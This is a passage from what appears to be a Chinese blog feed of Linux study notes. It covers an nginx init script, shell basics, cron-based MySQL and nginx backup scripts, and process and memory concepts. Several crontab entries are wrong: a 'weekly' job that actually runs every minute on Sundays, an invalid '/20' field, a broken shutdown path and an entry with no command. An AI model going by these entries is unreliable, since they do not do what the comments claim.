]&amp;&amp;[ $nginx_process_num -ge <span class="hljs-number">1</span> ];then<br>    action <span class="hljs-string">&quot;nginx stop&quot;</span> killall -s QUIT $nginxd<br>      #rm -f $pid_file<br>  else<br>    action <span class="hljs-string">&quot;nginx stop&quot;</span> killall -s QUIT $nginxd <span class="hljs-number">2</span>&gt;/dev/null<br>  fi<br>&#125;<br><br>restart () &#123;<br>  stop<br>  sleep <span class="hljs-number">1</span><br>  start<br>&#125;<br><br>reload () &#123;<br>  <span class="hljs-keyword">if</span> [ -f $pid_file ]&amp;&amp;[ $nginx_process_num -ge <span class="hljs-number">1</span> ];then<br>    action <span class="hljs-string">&quot;nginx reload&quot;</span> killall -s HUP nginx<br>  else<br>    action <span class="hljs-string">&quot;nginx reload&quot;</span> killall -s HUP nginx <span class="hljs-number">2</span>&gt;/dev/null<br>  fi<br>&#125;<br><br>status () &#123;<br>  <span class="hljs-keyword">if</span> [ -f $pid_file ]&amp;&amp;[ $nginx_process_num -ge <span class="hljs-number">1</span> ];then<br>    echo <span class="hljs-string">&quot;nginx running...&quot;</span><br>  else<br>    echo <span class="hljs-string">&quot;nginx stop&quot;</span><br>  fi<br>&#125;<br><br><br>#callable<br><span class="hljs-keyword">case</span> $<span class="hljs-number">1</span> <span class="hljs-keyword">in</span><br>start) start;;<br>stop) stop;;<br>restart) restart;;<br>reload) reload;;<br>status) status;;<br>*) echo <span class="hljs-string">&quot;USAGE: $0 start|stop|restart|reload|status&quot;</span>;;<br>esac<br></code></pre></td></tr></table></figure><p>查看运行结果：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># ps aux | grep nginx | grep -v grep</span><br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh #使用帮忙</span><br>USAGE: nginxd.sh start|<span class="hljs-string">stop</span>|<span class="hljs-string">restart</span>|<span class="hljs-string">reload</span>|status<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh start #开启进程</span><br> nginx start                                               [  OK  ]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh status #查看状态为开启状态</span><br>nginx running...<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh start #提示已开启</span><br>nginx running...<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh reload #重载进程</span><br>nginx reload                                               [  OK  ]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh restart #重启进程</span><br>nginx stop                                                 [  OK  ]<br> nginx start                                               [  OK  ]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh stop #关闭进程</span><br>nginx stop                                                 [  OK  ]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh status #查看状态为关闭状态</span><br>nginx stop<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh stop #提示已经关闭无法再关闭</span><br>nginx stop                                                 [FAILED]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh reload #提示已经关闭无法重载</span><br>nginx reload                                               [FAILED]<br>[root<span class="hljs-meta">@localhost</span> test20210731]<span class="hljs-comment"># sh nginxd.sh restart  #提示已经关闭无法重启</span><br>nginx stop                                                 [FAILED]<br> nginx start                                               [  OK  ]<br></code></pre></td></tr></table></figure><p> 添加到系统服务启动管理</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># cp -r nginxd.sh /etc/init.d/nginxd</span><br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># chmod 755 /etc/init.d/nginxd</span><br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># service nginxd status</span><br>nginx running...<br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># service nginxd stop</span><br>Stopping nginxd (via systemctl):  Warning: nginxd.service changed on disk. <span class="hljs-built_in">Run</span> <span class="hljs-string">&#x27;systemctl daemon-reload&#x27;</span> <span class="hljs-keyword">to</span> reload units.<br>                                                           [  确定  ]<br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># service nginxd status</span><br>nginx stop<br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># service nginxd start</span><br>Starting nginxd (via systemctl):                           [  确定  ]<br>[root<span class="hljs-symbol">@localhost</span> test20210731]<span class="hljs-meta"># service nginxd status</span><br>nginx running...<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux shell介绍</title>
    <link href="/2023/07/26/linux-shell%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/07/26/linux-shell%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p><strong>一、shell介绍</strong></p><p><strong>1、什么是shell</strong></p><p>shell是c语法编写的，是用户和liunx内核沟通的桥梁，即是命令语法，也是解释性编程语言。</p><p>内核处理的都是二进制，而用户处理的都是高级语法，系统开发人员可以通过shell快速操作计算机。</p><p><img src="640-1690379923004-2.png" alt="图片"></p><p><strong>二、shell功能</strong></p><p><strong>1、解析你的命令</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo <span class="hljs-string">&quot;helloword&quot;</span>helloword</span><br>helloword<br></code></pre></td></tr></table></figure><p><strong>2、启动程序</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@localhost ~]<span class="hljs-comment"># redis-server /myredis/redis.conf </span><br>[root@localhost ~]<span class="hljs-comment"># ps -ef | grep redis</span><br>root      <span class="hljs-number"> 2111 </span>    <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>01:13 ?        00:00:28 redis-server *:6379<br>root      <span class="hljs-number"> 2501 </span> <span class="hljs-number"> 2469 </span><span class="hljs-number"> 0 </span>05:53 pts/0    00:00:00 grep --color=auto redis<br></code></pre></td></tr></table></figure><p><strong>3、输入输出重定向</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># wc -c &lt; testmail.txt </span><br><span class="hljs-number">27</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo <span class="hljs-string">&quot;helloworld&quot;</span> &gt;&gt;  test0716.txt</span><br><br></code></pre></td></tr></table></figure><p><strong>4、管道连接</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo <span class="hljs-string">&quot;hello world&quot;</span> | sed <span class="hljs-string">&#x27;s/world/亲/&#x27;</span></span><br>hello 亲<br><br></code></pre></td></tr></table></figure><p><strong>5、文件名置换(echo /*)</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $&#123;user-root&#125;</span><br>root<br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># user=<span class="hljs-string">&quot;bktest&quot;</span></span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $? #判断上一条命令是否执行成，0代表成功</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><strong>6、变量维护</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $USER #当前用户</span><br>root<br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $USER #当前用户</span><br>root <br><br></code></pre></td></tr></table></figure><p><strong>7、环境控制</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $HOME #用户登录的目录</span><br>/root<br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># echo $UID #用户标识0</span><br><br></code></pre></td></tr></table></figure><p><strong>8、shell编程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>seconds_left=15<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请等待<span class="hljs-variable">$&#123;seconds_left&#125;</span>秒……</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">while</span> [ <span class="hljs-variable">$seconds_left</span> -gt 0 ];<span class="hljs-keyword">do</span>  <br>   <span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$seconds_left</span>  <br>   <span class="hljs-built_in">sleep</span> 1  seconds_left=$((<span class="hljs-variable">$seconds_left</span> - <span class="hljs-number">1</span>))  <br>   <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;\r     \r&quot;</span> <span class="hljs-comment">#清除本行文字</span><br>   <span class="hljs-keyword">done</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done!&quot;</span><br><br></code></pre></td></tr></table></figure><p>输出倒计时15秒</p><p><strong>三、shell脚本精髓</strong></p><p> shell脚本就是将完成一个任务的所有命令按照执行的先后顺序，自上而下写入一个文本文件中，然后给予执行权限。</p><p>举例示范：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@localhost test0717]<span class="hljs-comment"># vim nginx_intall.sh #写入shell脚本</span><br><span class="hljs-comment">#!/usr/bin/bash</span><br><span class="hljs-comment">#下载依赖</span><br>yum -y install wget gcc pcre-devel zlib-devel<br><span class="hljs-comment">#下载nginx</span><br>wget http:<span class="hljs-regexp">//</span>nginx.org<span class="hljs-regexp">/download/</span>nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">0</span>.tar.gz<br><span class="hljs-comment">#解压缩tar xf nginx-1.16.0.tar.gz</span><br><span class="hljs-comment">#进入目录</span><br>cd nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#配置安装</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>nginx<br>make<br>make install<br>[root@localhost test0717]<span class="hljs-comment"># chmod +x nginx_intall.sh</span><br>[root@localhost test0717]<span class="hljs-comment"># ./nginx_intall.sh</span><br><br></code></pre></td></tr></table></figure><p>nginx安装成功，验证并启动</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs subunit">... ... <br>cp conf/nginx.conf &#x27;/usr/local/nginx/conf/nginx.conf.default&#x27;<br><span class="hljs-keyword">test </span>-d &#x27;/usr/local/nginx/logs&#x27; \<br>    || mkdir -p &#x27;/usr/local/nginx/logs&#x27;<br><span class="hljs-keyword">test </span>-d &#x27;/usr/local/nginx/logs&#x27; \<br>    || mkdir -p &#x27;/usr/local/nginx/logs&#x27;<br><span class="hljs-keyword">test </span>-d &#x27;/usr/local/nginx/html&#x27; \<br>    || cp -R html &#x27;/usr/local/nginx&#x27;<br><span class="hljs-keyword">test </span>-d &#x27;/usr/local/nginx/logs&#x27; \<br>    || mkdir -p &#x27;/usr/local/nginx/logs&#x27;<br>make[1]: Leaving directory `/root/test0717/nginx<span class="hljs-string">-1</span>.16.0&#x27;<br>[root@localhost test0717]# cd /usr/local/nginx/<br>[root@localhost nginx]# ls<br>conf  html  logs  sbin<br>[root@localhost nginx]# ./sbin/nginx <br>[root@localhost nginx]# ps -ef|grep nginx<br>root     109211      1  0 06:41 ?        00:00:00 nginx: master process ./sbin/nginx<br>nobody   109212 109211  0 06:41 ?        00:00:00 nginx: worker process<br>root     109214 103997  0 06:41 pts/0    00:00:00 grep --color=auto nginx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第四周</title>
    <link href="/2023/07/24/%E7%AC%AC%E5%9B%9B%E5%91%A8/"/>
    <url>/2023/07/24/%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-定时任务"><a href="#1-定时任务" class="headerlink" title="1.定时任务"></a>1.定时任务</h1><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##启用定时任务服务</span><br>systemctl status crond<br>systemctl <span class="hljs-built_in">enable</span> --now crond<br><br><span class="hljs-comment">##crontab -e </span><br>* * * * 7 /bin/bash /script/mysqlbk.sh <span class="hljs-comment">##每周日执行MySQL的hellodb全备，并且记录日志 </span><br> * * * * 1 /bin/bash /script/mysqlbk/mysqltar.sh <span class="hljs-comment">##每周1定时打包1周mysql.sql文件到指定备份目录</span><br>30 23 * * * <span class="hljs-comment">##每天23点30分备份当天的nginx的access.log目录</span><br>30 23 * * * /usr/sbin shutdown -h now <span class="hljs-comment">##每天23点30分定时关机测试机</span><br>30 1 * * 1-5 /bin/bash /script/nginxbk.sh <span class="hljs-comment">##工作日周一到周五1点30备份nginx日志到指定目录</span><br> * */2 * * * /bin/bash /srcipt/memrecord.sh <span class="hljs-comment">##每隔2小时输出/proc/meminfo Mem内存信息到指定文件</span><br>/20 * * * * /bin/bash /srcipt/disk_check.sh <span class="hljs-comment">##每隔20min检查所有/dev/分区的磁盘，如果超过了80，则报警发送邮件到指定邮箱</span><br> * * * * *  <span class="hljs-built_in">sleep</span> 30; /scripts/script.sh <span class="hljs-comment">##每隔30s执行一次命令，先sleep 30s先</span><br>@reboot /scripts/script.sh <span class="hljs-comment">##系统重启后自动执行该脚本</span><br><span class="hljs-built_in">date</span>使用<br>1、获取今天日期<br>$ <span class="hljs-built_in">date</span> -d now +%Y-%m-%d   或者<br>$ <span class="hljs-built_in">date</span> +%F<br>2、获取明天日期<br>$ <span class="hljs-built_in">date</span> -d next-day +%Y-%m-%d<br>$ <span class="hljs-built_in">date</span> -d tomorrow +%Y-%m-%d<br>3、获取昨天日期<br>$ <span class="hljs-built_in">date</span> -d yesterday +%Y-%m-%d  或者<br>$ <span class="hljs-built_in">date</span> -d last-day +%Y-%m-%d  或者<br>$ <span class="hljs-built_in">date</span> -d <span class="hljs-string">&quot;1 days ago&quot;</span> +%Y-%m-%d<br><span class="hljs-comment">##&quot;n days ago&quot;  表示n天前的那一天</span><br>4、获取取30天前的日期<br>$ <span class="hljs-built_in">date</span> -d <span class="hljs-string">&quot;30 days ago&quot;</span> +%Y-%m-%d<br></code></pre></td></tr></table></figure><h2 id="对应shell脚本"><a href="#对应shell脚本" class="headerlink" title="对应shell脚本"></a>对应shell脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##mysqlbk.sh，数据库备份脚本</span><br><span class="hljs-comment">#备份mysql库</span><br><span class="hljs-comment">##每次需要用户手动输入用户名+密码</span><br>user=<span class="hljs-variable">$1</span><br>passwd=<span class="hljs-variable">$2</span><br>dbname=<span class="hljs-string">&quot;hellodb&quot;</span><br><span class="hljs-built_in">date</span>=$(<span class="hljs-built_in">date</span> +%Y-%m-%d_%H-%M-%S)<br>path=/backup/mysql<br><br><span class="hljs-keyword">if</span> [ -d /backup/mysql ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir created&quot;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">mkdir</span> -p /backup/mysql<br><span class="hljs-keyword">fi</span><br><br>mysqldump -u<span class="hljs-variable">$&#123;user&#125;</span> -p<span class="hljs-variable">$&#123;passwd&#125;</span> <span class="hljs-variable">$&#123;dbname&#125;</span> &gt; <span class="hljs-variable">$path</span>/<span class="hljs-string">&quot;<span class="hljs-variable">$dbname</span>&quot;</span>.<span class="hljs-variable">$&#123;date&#125;</span>.sql<br><br><span class="hljs-comment">#cd $path</span><br><span class="hljs-comment">#tar -czf log-$&#123;dbname&#125;-$date.tar.gz &quot;$dbname&quot;-$&#123;date&#125;.sql</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;date&#125;</span>-<span class="hljs-variable">$&#123;dbname&#125;</span>.sql backup successfully&quot;</span> &gt;&gt; <span class="hljs-variable">$path</span>/backup.log<br><br><br><span class="hljs-comment">##定时备份脚本：nginxbk.sh</span><br><span class="hljs-built_in">date</span>=`<span class="hljs-built_in">date</span> -d yesterday +%Y-%m-%d<span class="hljs-string">&#x27; &#x27;</span>%H-%M-%S`<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$date</span><br><br><span class="hljs-keyword">if</span> [ -d /test/backup ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir exist&quot;</span><br><span class="hljs-keyword">else</span>    <br>        <span class="hljs-built_in">mkdir</span> -p /test/backup<br><span class="hljs-keyword">fi</span>      <br><br>tar -czf nginx-<span class="hljs-variable">$&#123;date&#125;</span>.tar.gz /var/log/nginx/access.log<br><span class="hljs-built_in">mv</span> nginx-<span class="hljs-variable">$&#123;date&#125;</span>.tar.gz /backup/<br><br><br><span class="hljs-comment">##输出内存信息到这里:memrecord.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">date</span>=`<span class="hljs-built_in">date</span> -d now +%Y-%m-%d<span class="hljs-string">&#x27; &#x27;</span>%H`<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$date</span> &gt;&gt; /test/week4/meminfo.txt<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> /proc/meminfo | grep <span class="hljs-string">&quot;^Mem&quot;</span>` &gt;&gt; /test/week4/meminfo.txt<br><br><br><span class="hljs-comment">##磁盘检查disk_check.sh</span><br><span class="hljs-comment">##date:date实现</span><br><span class="hljs-built_in">date</span>=`<span class="hljs-built_in">date</span> +%Y-%m-%d<span class="hljs-string">&#x27; &#x27;</span>%H-%M-%S`<br><span class="hljs-comment">#disk_id=`df -h | grep &#x27;^/dev/&#x27; | awk &#x27;&#123;print $1&#125;&#x27;`</span><br>disk=`<span class="hljs-built_in">df</span> -h | grep <span class="hljs-string">&#x27;^/dev/&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> -d %`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$disk</span> -ge 80 ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;时间:<span class="hljs-variable">$&#123;date&#125;</span>,磁盘<span class="hljs-variable">$&#123;disk_id&#125;</span>使用率超过80，告警&quot;</span> | mail -s <span class="hljs-string">&quot;disk safe&quot;</span>root@qq.com<br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;时间:<span class="hljs-variable">$&#123;date&#125;</span>,磁盘<span class="hljs-variable">$&#123;disk_id&#125;</span>使用率未超过80，安全&quot;</span> | mail -s <span class="hljs-string">&quot;warning&quot;</span> root@qq.com<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h1 id="2-图文并茂说明Linux进程和内存概念"><a href="#2-图文并茂说明Linux进程和内存概念" class="headerlink" title="2.图文并茂说明Linux进程和内存概念"></a>2.图文并茂说明Linux进程和内存概念</h1><h2 id="Linux进程"><a href="#Linux进程" class="headerlink" title="Linux进程"></a>Linux进程</h2><p>其实是Linux系统运行时的一份副本，一个进程（process）其实就是Linux系统内的一个目录，目录位于/proc下<br>每个进程都有一个ID号，称为PID，每个PID都有一个目录<br>每个服务程序在运行的时候，都会产生一个进程，进程会加载到内存里，作为程序运行的临时空间；如果从内存中杀死进程，则这个程序的运行就终止了</p><p><img src="2792175-20220828180456539-1523009683.png" alt="image-20220826225753842"></p><p>一个进程会单独占用一块内存空间（估计不大）<br>进程内又会有线程，表示这个进程在系统内的多个线程（员工），用于生产<br>一个进程里，至少有一个线程，线程就是工作的实体</p><p><img src="2792175-20220828180457168-1515232121.png" alt="image-20220826225805026"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">常见进程管理命令：<br>pstree -p <span class="hljs-comment">##列出所有父进程以及子进程，看是否是多线程工作</span><br>ps -A <span class="hljs-comment">##列出所有的进程</span><br>ps -aux <span class="hljs-comment">##显示所有包含其他使用者的进程,显示较详细的资讯，比ps -ef要多一些</span><br>ps -ef <span class="hljs-comment">##所有用户+所有进程的列表</span><br><br>ps aux | grep mysqld<br>ps aux | grep docker<br></code></pre></td></tr></table></figure><h2 id="线程是程序执行的最小单位，一个进程由多个线程组成"><a href="#线程是程序执行的最小单位，一个进程由多个线程组成" class="headerlink" title="线程是程序执行的最小单位，一个进程由多个线程组成"></a>线程是程序执行的最小单位，一个进程由多个线程组成</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">pstree -p查看mysqld服务的线程：5639的Pid为整个mysqld服务的父进程，下面都是线程<br>mysqld(5639)上一级是systemd，证明systemd是所有服务、程序的父进程，系统启动的时候第一个启动systemd进程<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828180457478-1239181084.png" alt="image-20220826225824233"></p><h2 id="进程使用内存问题"><a href="#进程使用内存问题" class="headerlink" title="进程使用内存问题"></a>进程使用内存问题</h2><p>内存泄漏，内存超限（溢出），内存不足（OOM）</p><p>内存使用空间分为：用户态和内核态，用户空间+内核空间<br>一部分空间给到内核使用（例如4G的内存，1/4给到内核使用），一部分给到用户的应用程序使用</p><p><img src="2792175-20220828180457781-1555452207.png" alt="image-20220826225835543"></p><p>内存泄漏：malloc分配了一定空间的内容，比如10M，但是没去占用，又不释放<br>内存溢出：分配了10M的空间，但是你的进程占用超过了10M，则会占用其他人的内容空间<br>内存不足：OOM，out of memory<br>java程序：占用程序内存过多</p><p>磁盘内的文件需要被访问：一定要加载到内存中才能被访问<br>比如说我这个执行命令/usr/sbin/php-fpm，当我执行的时候，就在进程内看到了</p><p><img src="2792175-20220828180458282-582645441.png" alt="image-20220826230001535"></p><p>父进程654，就是所有php以及其子进程都是依赖systemd（1）-php-fpm（654）</p><p><img src="2792175-20220828180458658-691027719.png" alt="image-20220826230006053"></p><p>相当于这个就是存在磁盘内的文件，现在被加载到内容中运行了，PID为654</p><p><img src="2792175-20220828180458925-456387921.png" alt="image-20220826230010926"></p><h2 id="Linux内存"><a href="#Linux内存" class="headerlink" title="Linux内存"></a>Linux内存</h2><p>内存是服务器内的重要的一个硬件指标，一般来说，一个程序或者服务在运行的时候，会生成一个或者多个进程，而进程就是运行在内存中的。<br>内存的特点是读写速度快，缺点是不会持久化保存，也是和磁盘等持久化存储的一个很大的差别<br>还有内存的购买费用较高，企业内部一些运行的服务（丽日数据库）非常消耗内存，所以在上新系统系统/观察老系统运行情况时，内存都是一个非常重要的指标<br>查看内存的读写情况：vmstat，包括物理内存的使用量，swap交换分区的使用量，buffers(写缓存)和cache(读缓存)的使用量；写和读缓存主要是加速磁盘内容的读写<br>磁盘内的文件需要读的时候，一定要加载到内存内进行读写的操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master week4]<span class="hljs-comment">#vmstat</span><br>procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----<br> r  b   swpd   free   buff  cache   si   so    bi    bo   <span class="hljs-keyword">in</span>   cs us sy <span class="hljs-built_in">id</span> wa st<br> 1  0      0 2094996   2256 597756    0    0    92    15  102  164  0  0 98  2  0<br><br>[root@master week4]<span class="hljs-comment">#free -h</span><br>              total        used        free      shared  buff/cache   available<br>Mem:           3.7G        1.1G        2.0G         12M        585M        2.3G<br>Swap:            0B          0B          0B<br></code></pre></td></tr></table></figure><h1 id="3-图文并茂说明Linux启动流程"><a href="#3-图文并茂说明Linux启动流程" class="headerlink" title="3.图文并茂说明Linux启动流程"></a>3.图文并茂说明Linux启动流程</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 